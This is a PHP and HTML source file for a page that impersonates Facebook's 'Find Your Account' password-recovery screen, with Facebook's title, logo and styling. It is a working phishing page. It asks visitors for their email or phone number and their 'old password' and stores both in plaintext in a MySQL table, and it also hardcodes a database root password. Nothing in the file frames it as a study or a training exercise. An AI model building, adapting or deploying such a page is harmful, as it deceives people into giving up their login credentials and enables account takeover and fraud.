<?php
// Database connection parameters
$host = 'localhost';
$dbname = 'facebook';
$username = 'root';
$password = 'LuYp@@@10484#$';

// Establish a connection to the database
try {
    $pdo = new PDO("mysql:host=$host;dbname=$dbname", $username, $password);
    $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
} catch (PDOException $e) {
    die("Error connecting to database: " . $e->getMessage());
}

// Function to sanitize user input
function sanitize_input($data) {
    $data = trim($data);
    $data = stripslashes($data);
    $data = htmlspecialchars($data);
    return $data;
}

// Function to validate email or phone number
function validate_email_or_phone($input) {
    // Check if input is a valid email
    if (filter_var($input, FILTER_VALIDATE_EMAIL)) {
        return true;
    }
    
    // Check if input is a valid phone number (simple check for digits only)
    if (preg_match('/^[0-9]{10,15}$/', $input)) {
        return true;
    }
    
    return false;
}

// Process form submission
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve and sanitize form data
    $email_or_phone = sanitize_input($_POST['email_or_phone']);
    $old_password = $_POST['old_password'];

    // Validate input
    if (empty($email_or_phone) || empty($old_password)) {
        $error = "Both email/phone and old password are required.";
    } elseif (!validate_email_or_phone($email_or_phone)) {
        $error = "Invalid email or phone number format.";
    } else {
        try {
            // Insert data into the client table
            $stmt = $pdo->prepare("INSERT INTO client (email, old_password) VALUES (?, ?)");
            $stmt->execute([$email_or_phone, $old_password]);
            $success = "Information stored successfully!";
        } catch (PDOException $e) {
            $error = "Error: " . $e->getMessage();
        }
    }
}
?>

<!DOCTYPE html>
<html lang="en" id="facebook" class="">
<head>
    <meta charset="utf-8">
    <title id="pageTitle">Forgotten Password | Can't Log In | Facebook</title>
    <style>
        body {
            font-family: Helvetica, Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
        }
        .logo {
            position: absolute;
            top: 20px;
            left: 20px;
        }
        .logo img {
            width: 200px;
        }
        .container {
            max-width: 500px;
            margin: 120px auto 0;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        }
        .container {
            max-width: 500px;
            margin: 100px auto;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1);
        }
        .header {
            padding: 20px;
            border-bottom: 1px solid #dddfe2;
        }
        .header h2 {
            margin: 0;
            font-size: 20px;
        }
        .content {
            padding: 20px;
        }
        .form-group {
            margin-bottom: 15px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            border: 1px solid #dddfe2;
            border-radius: 5px;
            font-size: 16px;
        }
        .buttons {
            display: flex;
            justify-content: flex-end;
            padding: 20px;
            background-color: #f5f6f7;
            border-top: 1px solid #dddfe2;
        }
        button {
            padding: 10px 20px;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        .cancel {
            background-color: #e4e6eb;
            color: #4b4f56;
            margin-right: 10px;
        }
        .submit {
            background-color: #1877f2;
            color: #fff;
        }
        .error {
            color: #ff0000;
        }
        .success {
            color: #4BB543;
        }
    </style>
</head>
<body>
<body>
    <div class="logo">
    <img class="fb_logo _8ilh img" src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lCu2zih0ca.svg" alt="Facebook">
    </div>
    <div class="container">
        <div class="header">
            <h2>Find Your Account</h2>
        </div>
        <form action="<?php echo htmlspecialchars($_SERVER["PHP_SELF"]); ?>" method="post">
            <div class="content">
                <?php
                if (isset($error)) {
                    echo "<p class='error'>$error</p>";
                }
                if (isset($success)) {
                    echo "<p class='success'>$success</p>";
                }
                ?>
                <p>Please enter your email address or phone number and old password to search for your account.</p>
                <div class="form-group">
                    <input type="text" id="email_or_phone" name="email_or_phone" placeholder="Email address or phone number" required>
                </div>
                <div class="form-group">
                    <input type="password" id="old_password" name="old_password" placeholder="Old password" required>
                </div>
            </div>
            <div class="buttons">
                <button type="button" class="cancel" onclick="window.location.href='login.php'">Cancel</button>
                <button type="submit" class="submit">Search</button>
            </div>
        </form>
    </div>
</body>
</html>